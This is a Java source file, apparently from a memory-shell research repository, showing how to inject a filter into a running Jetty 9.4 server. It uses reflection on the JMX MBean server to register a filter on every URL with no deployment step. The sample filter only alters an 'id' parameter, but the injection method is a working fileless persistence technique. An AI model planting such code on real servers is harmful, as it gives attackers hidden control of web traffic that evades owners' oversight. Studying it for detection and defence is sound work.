package org.su18.memshell.test.jetty;

import com.sun.jmx.mbeanserver.JmxMBeanServer;
import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;

import javax.management.ObjectName;
import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletRequestWrapper;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.EnumSet;
import java.util.Set;

/**
 * 来自项目 https://github.com/feihong-cs/memShell
 * filter 也需要 map 到 url 上
 * 亲测有效
 * 测试版本 Jetty 9.4.22
 *
 * @author su18
 */
public class AddJettyFilter extends HttpServlet {

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

		try {
			String filterName = "su18JettyFilter";
			String urlPattern = "/*";

			JmxMBeanServer mBeanServer = (JmxMBeanServer) ManagementFactory.getPlatformMBeanServer();

			Field field = mBeanServer.getClass().getDeclaredField("mbsInterceptor");
			field.setAccessible(true);
			Object obj = field.get(mBeanServer);

			field = obj.getClass().getDeclaredField("repository");
			field.setAccessible(true);
			Field modifier = field.getClass().getDeclaredField("modifiers");
			modifier.setAccessible(true);
			modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
			Repository repository = (Repository) field.get(obj);

			Set<NamedObject> namedObjectSet = repository.query(new ObjectName("org.eclipse.jetty.webapp:type=webappcontext,*"), null);
			for (NamedObject namedObject : namedObjectSet) {
				try {
					field = namedObject.getObject().getClass().getSuperclass().getSuperclass().getDeclaredField("_managed");
					field.setAccessible(true);
					modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
					Object webAppContext = field.get(namedObject.getObject());

					field = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
					field.setAccessible(true);
					Object handler = field.get(webAppContext);

					field = handler.getClass().getDeclaredField("_filters");
					field.setAccessible(true);
					Object[] objects = (Object[]) field.get(handler);

					boolean flag = false;
					for (Object o : objects) {
						field = o.getClass().getSuperclass().getDeclaredField("_name");
						field.setAccessible(true);
						String name = (String) field.get(o);
						if (name.equals(filterName)) {
							flag = true;
							break;
						}
					}

					if (!flag) {

						ClassLoader classLoader = handler.getClass().getClassLoader();
						Class       sourceClazz = null;
						Object      holder      = null;
						try {
							sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
							field = sourceClazz.getDeclaredField("JAVAX_API");
							modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
							Method method = handler.getClass().getMethod("newFilterHolder", sourceClazz);
							holder = method.invoke(handler, field.get(null));
						} catch (ClassNotFoundException e) {
							sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
							Method method = handler.getClass().getMethod("newFilterHolder", sourceClazz);
							holder = method.invoke(handler, Enum.valueOf(sourceClazz, "JAVAX_API"));
						}

						holder.getClass().getMethod("setName", String.class).invoke(holder, filterName);
						Filter filter = new TestFilter();
						holder.getClass().getMethod("setFilter", Filter.class).invoke(holder, filter);
						handler.getClass().getMethod("addFilter", holder.getClass()).invoke(handler, holder);

						Class  clazz         = classLoader.loadClass("org.eclipse.jetty.servlet.FilterMapping");
						Object filterMapping = clazz.newInstance();
						Method method        = filterMapping.getClass().getDeclaredMethod("setFilterHolder", holder.getClass());
						method.setAccessible(true);
						method.invoke(filterMapping, holder);
						filterMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(filterMapping, new Object[]{new String[]{urlPattern}});
						filterMapping.getClass().getMethod("setDispatcherTypes", EnumSet.class).invoke(filterMapping, EnumSet.of(DispatcherType.REQUEST));

						// prependFilterMapping 会自动把 filter 加到最前面
						handler.getClass().getMethod("prependFilterMapping", filterMapping.getClass()).invoke(handler, filterMapping);

						resp.getWriter().println("Jetty Filter added");
					}
				} catch (Exception e) {
					//pass
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static class TestFilter implements Filter {

		/**
		 * 初始化 filter
		 *
		 * @param filterConfig FilterConfig
		 */
		@Override
		public void init(FilterConfig filterConfig) {
		}

		/**
		 * doFilter 方法处理过滤器逻辑
		 *
		 * @param servletRequest  ServletRequest
		 * @param servletResponse ServletResponse
		 * @param filterChain     FilterChain
		 * @throws IOException      抛出异常
		 * @throws ServletException 抛出异常
		 */
		@Override
		public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
			// 给下一个过滤器
			filterChain.doFilter(new AddJettyFilter.TestFilter.FilterRequest((HttpServletRequest) servletRequest), servletResponse);
		}

		/**
		 * 销毁时执行的方法
		 */
		@Override
		public void destroy() {
		}

		/**
		 * 自定义 FilterRequest 重写 getParameter 方法处理 id 值
		 */
		class FilterRequest extends HttpServletRequestWrapper {

			public FilterRequest(HttpServletRequest request) {
				super(request);
			}

			@Override
			public String getParameter(String name) {
				if ("id".equals(name)) {
					String originalId = super.getParameter(name);

					if (originalId != null && !originalId.isEmpty()) {
						int idNum = (Integer.parseInt(originalId) + 127);
						return Integer.toString(idNum);
					}
				}
				return super.getParameter(name);
			}
		}
	}
}
